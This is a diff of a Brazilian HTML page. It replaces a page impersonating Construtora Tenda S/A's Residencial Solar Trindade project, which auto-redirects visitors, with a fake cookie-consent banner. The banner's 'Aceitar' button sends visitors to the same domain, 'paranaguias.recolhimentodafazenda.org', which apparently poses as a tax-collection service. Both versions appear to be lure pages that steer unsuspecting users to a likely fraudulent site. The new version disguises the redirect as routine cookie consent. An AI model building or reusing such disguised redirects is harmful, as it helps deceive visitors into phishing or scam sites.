@@ -1,95 +1,75 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Construtora Tenda S/A - Residencial Solar Trindade. Habitação de qualidade em São Gonçalo - RJ.">
-  <meta name="robots" content="index, follow">
-  <link rel="canonical" href="#">
-  <title>Construtora Tenda S/A</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Política de Cookies</title>
   <style>
     body {
-      margin: 0;
       font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      color: #222;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #fff;
     }
-    header {
-      background: linear-gradient(90deg, #005b96, #007acc);
-      color: white;
-      padding: 40px 20px;
+    .cookie-banner {
       text-align: center;
+      padding: 20px;
+      max-width: 400px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
     }
-    nav {
-      background: #004b87;
-      padding: 10px;
-      text-align: center;
+    .cookie-banner p {
+      margin-bottom: 20px;
+      color: #333;
     }
-    nav a {
-      color: white;
-      margin: 0 15px;
-      text-decoration: none;
+    .cookie-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+    }
+    .cookie-buttons button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
       font-weight: bold;
     }
-    section {
-      max-width: 1000px;
-      margin: auto;
-      padding: 40px 20px;
-      background: white;
-      margin-top: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    .accept-btn {
+      background-color: #4CAF50;
+      color: white;
     }
-    footer {
-      background: #222;
-      color: #ccc;
-      text-align: center;
-      padding: 30px 20px;
-      margin-top: 40px;
-    }
-    iframe {
-      width: 100%;
-      height: 300px;
-      border: none;
-      margin-top: 20px;
+    .deny-btn {
+      background-color: #f44336;
+      color: white;
     }
   </style>
 </head>
-<script> window.location.href = "https://paranaguias.recolhimentodafazenda.org/"; </script>
 <body>
-  <header>
-    <h1>Construtora Tenda S/A</h1>
-    <p>Qualidade de vida e moradia com a confiança da Residencial Solar Trindade</p>
-  </header>
 
-  <nav>
-    <a href="#sobre">Sobre</a>
-    <a href="#contato">Contato</a>
-    <a href="#localizacao">Localização</a>
-  </nav>
+  <div class="cookie-banner" id="cookieBanner">
+    <p>Este site utiliza cookies para melhorar sua experiência. Deseja aceitar o uso de cookies?</p>
+    <div class="cookie-buttons">
+      <button class="accept-btn" onclick="aceitarCookies()">Aceitar</button>
+      <button class="deny-btn" onclick="negarCookies()">Negar</button>
+    </div>
+  </div>
 
-  <section id="sobre">
-    <h2>Sobre o Residencial</h2>
-    <p>O <strong>Residencial Solar Trindade</strong> é um projeto da <strong>Construtora Tenda S/A</strong>, pensado para oferecer conforto, segurança e acessibilidade a famílias que desejam conquistar sua casa própria. Localizado em São Gonçalo, no bairro Trindade, o empreendimento alia infraestrutura moderna com uma excelente localização urbana.</p>
-    <p>A Tenda é reconhecida nacionalmente pela sua atuação no setor habitacional com foco em moradias populares e de qualidade. Este residencial é mais um passo em direção ao compromisso com o sonho da casa própria acessível a todos.</p>
-  </section>
+  <script>
+    function aceitarCookies() {
+      // Redirecione ou registre a aceitação
+      window.location.href = "https://paranaguias.recolhimentodafazenda.org/"; // Substitua com o link desejado
+    }
 
-  <section id="contato">
-    <h2>Contato</h2>
-    <p><strong>E-mail:</strong> <a href="mailto:fiscal@tenda.com">fiscal@tenda.com</a></p>
-    <p><strong>Telefone(s):</strong><br>(11) 3111-2501<br>(11) 3111-2500</p>
-  </section>
+    function negarCookies() {
+      // Redirecione ou feche o banner
+      document.getElementById('cookieBanner').style.display = 'none';
+    }
+  </script>
 
-  <section id="localizacao">
-    <h2>Localização</h2>
-    <p><strong>Endereço:</strong><br>Rua Itaocara, S/N<br>Trindade, São Gonçalo - RJ<br>CEP: 24456-595</p>
-    <iframe src="https://www.google.com/maps?q=Rua+Itaocara,+Trindade,+S%C3%A3o+Gon%C3%A7alo+-+RJ&output=embed"></iframe>
-  </section>
-
-  <footer>
-    <p>&copy; 2025 Construtora Tenda S/A - Residencial Solar Trindade</p>
-    <p>CNPJ: 71.476.527/0186-97</p>
-    <p>Rua Itaocara, S/N - Trindade, São Gonçalo - RJ, 24456-595</p>
-  </footer>
 </body>
 </html>
